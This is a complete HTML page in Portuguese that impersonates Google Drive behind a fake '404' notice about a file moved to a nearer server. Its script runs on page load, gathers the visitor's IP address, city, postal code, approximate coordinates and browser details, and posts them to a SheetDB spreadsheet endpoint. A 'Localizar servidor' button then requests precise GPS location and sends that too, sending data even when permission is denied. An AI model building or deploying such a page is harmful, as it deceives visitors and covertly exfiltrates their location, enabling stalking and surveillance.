<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Google Drive</title>
<style>
body {
  font-family: Arial, sans-serif;
  padding: 20px;
  background: #f5f5f5;
}
.error-box {
  background: white;
  padding: 30px;
  border-radius: 8px;
  max-width: 500px;
  margin: 50px auto;
  text-align: center;
}
button {
  background: #1a73e8;
  color: white;
  border: none;
  padding: 12px 24px;
  border-radius: 4px;
  cursor: pointer;
  margin-top: 20px;
}
#debug {
  background: #f0f0f0;
  padding: 15px;
  margin-top: 20px;
  border-radius: 4px;
  font-size: 12px;
  text-align: left;
  font-family: monospace;
  white-space: pre-wrap;
  word-break: break-all;
}
</style>
</head>
<body>
<div class="error-box">
  <h1>404: NOT FOUND</h1>
  <p>O ficheiro foi movido para um servidor mais próximo da sua localização.</p>
  <button id="findServer">Localizar servidor</button>
  <div id="debug">A carregar...</div>
</div>

<script>
const debugLog = document.getElementById('debug');

function log(msg) {
  console.log(msg);
  debugLog.textContent += msg + '\n';
}

async function getIPandLocation() {
  try {
    log('A obter dados de IP...');
    const response = await fetch('https://ipwhois.app/json/');
    const data = await response.json();
    log('✓ Dados de IP obtidos: ' + data.city + ', ' + data.region);
    return {
      country: data.country,
      region: data.region,     
      city: data.city,         
      postal: data.postal,     
      lat_ip: data.latitude,
      lon_ip: data.longitude,
      ip: data.ip              
    };
  } catch(e) {
    log('✗ Erro ao obter IP: ' + e.message);
    return {};
  }
}

function getBrowserInfo() {
  return {
    userAgent: navigator.userAgent,
    language: navigator.language,
    screenWidth: window.screen.width,
    screenHeight: window.screen.height,
    timestamp: new Date().toISOString()
  };
}

async function sendDataToSheet(collectedData) {
  const sheetDbUrl = 'https://sheetdb.io/api/v1/eu5qmx1222j2g';
  try {
    log('A enviar dados para SheetDB...');
    log('Dados: ' + JSON.stringify(collectedData, null, 2));
    const response = await fetch(sheetDbUrl, {
      method: 'POST',
      headers: { 
        'Accept': 'application/json',
        'Content-Type': 'application/json' 
      },
      body: JSON.stringify({
        data: [collectedData]
      })
    });
    const result = await response.json();
    log('✓ Resposta SheetDB: ' + JSON.stringify(result));
  } catch(e) {
    log('✗ Erro ao enviar: ' + e.message);
  }
}

// Coleta IP automaticamente
let ipData = {};
(async () => {
  log('=== INÍCIO ===');
  ipData = await getIPandLocation();
  const browserData = getBrowserInfo();
  log('✓ Dados do navegador obtidos');
  
  // Envia dados de IP automaticamente
  const autoData = {...ipData, ...browserData, collection_type: 'auto'};
  await sendDataToSheet(autoData);
  log('✓ Dados automáticos enviados (IP apenas)');
})();

document.getElementById('findServer').addEventListener('click', async function() {
  const btn = this;
  btn.textContent = 'A localizar...';
  btn.disabled = true;
  
  log('\n=== BOTÃO CLICADO ===');
  log('Navigator.geolocation disponível? ' + (navigator.geolocation ? 'SIM' : 'NÃO'));
  
  const browserData = getBrowserInfo();
  let geoLocationSent = false;

  if (navigator.geolocation) {
    log('A pedir geolocalização...');
    
    const geoTimeout = setTimeout(async () => {
      if (!geoLocationSent) {
        log('⏱ Timeout de geolocalização (15s)');
        const collectedData = {...ipData, ...browserData, geo_error: 3, collection_type: 'timeout'};
        await sendDataToSheet(collectedData);
        geoLocationSent = true;
        btn.textContent = 'Timeout - dados enviados';
      }
    }, 15000);

    const options = {
      enableHighAccuracy: false,
      timeout: 12000,
      maximumAge: 60000
    };

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        log('✓ Geolocalização obtida!');
        log('Lat: ' + pos.coords.latitude + ', Lon: ' + pos.coords.longitude);
        log('Precisão: ' + pos.coords.accuracy + 'm');
        
        clearTimeout(geoTimeout);
        if (!geoLocationSent) {
          const collectedData = {
            ...ipData,
            lat_browser: pos.coords.latitude,
            lon_browser: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            ...browserData,
            collection_type: 'gps_success'
          };
          await sendDataToSheet(collectedData);
          geoLocationSent = true;
          btn.textContent = '✓ Dados GPS enviados!';
        }
      },
      async (error) => {
        log('✗ Erro de geolocalização: Código ' + error.code);
        log('Mensagem: ' + error.message);
        
        clearTimeout(geoTimeout);
        if (!geoLocationSent) {
          const collectedData = {...ipData, ...browserData, geo_error: error.code, collection_type: 'gps_error'};
          await sendDataToSheet(collectedData);
          geoLocationSent = true;
          btn.textContent = 'Erro - dados IP enviados';
        }
      },
      options
    );
  } else {
    log('✗ Navegador não suporta geolocalização');
    const collectedData = {...ipData, ...browserData, collection_type: 'no_geo'};
    await sendDataToSheet(collectedData);
    btn.textContent = 'Sem geolocalização - IP enviado';
  }
});
</script>

</body>
</html>

